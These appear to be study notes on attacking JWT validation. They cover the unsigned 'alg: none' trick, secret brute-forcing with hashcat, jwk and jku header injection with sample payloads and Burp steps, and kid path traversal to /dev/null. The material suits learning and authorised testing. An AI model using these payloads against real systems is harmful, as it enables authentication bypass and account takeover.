[[JWT]]
#jwt/flaws
### Misconfiguration
##### Accepting arbitrary signatures
Developer run `decode()` and forgot to call`verify()`

##### Accepting tokens with no signature
```json
{
	"alg": "none"
}
```
Bypass server validation with case or encoding manipulation, e.g. `"NoNe"`
and remove the signature part of the token

##### Brute-forcing secret keys
https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list
```bash
hashcat -a 0 -m 16500 <valid jwt> <wordlist>
```

### JWT header parameter injections
* jwk - json web key - key json object
* jwu - json web key set url - url to fetch the list of keys
* kid - key ID

##### Injecting self-signed JWT via jwk
example:
```json
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```
Attack with Burp JWT Editor:
1. With the extension loaded, in Burp's main tab bar, go to the JWT Editor Keys tab.
2. Generate a new RSA key.
3. Send a request containing a JWT to Burp Repeater.
4. In the message editor, switch to the extension-generated JSON Web Token tab and modify the token's payload however you like.
5. Click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key.
6. Send the request to test how the server responds.
##### Injecting self-signed JWTs via the jku parameter
typical URL is `/.well-known/jwks.json`
```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
```

##### Injecting self-signed JWTs via the kid parameter
```json
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```
attacks on kid:
* `../../../dev/null` and sign token with empty secret
* path traversal looking for key file
* SQL injection


#### Other interesting JWT header parameters
The following header parameters may also be interesting for attackers:
* cty (Content Type) - Sometimes used to declare a media type for the content in the JWT payload. This is usually omitted from the header, but the underlying parsing library may support it anyway. If you have found a way to bypass signature verification, you can try injecting a cty header to change the content type to text/xml or application/x-java-serialized-object, which can potentially enable new vectors for XXE and deserialization attacks.
* x5c (X.509 Certificate Chain) - Sometimes used to pass the X.509 public key certificate or certificate chain of the key used to digitally sign the JWT. This header parameter can be used to inject self-signed certificates, similar to the jwk header injection attacks discussed above. Due to the complexity of the X.509 format and its extensions, parsing these certificates can also introduce vulnerabilities. Details of these attacks are beyond the scope of these materials, but for more details, check out CVE-2017-2800 and CVE-2018-2633.
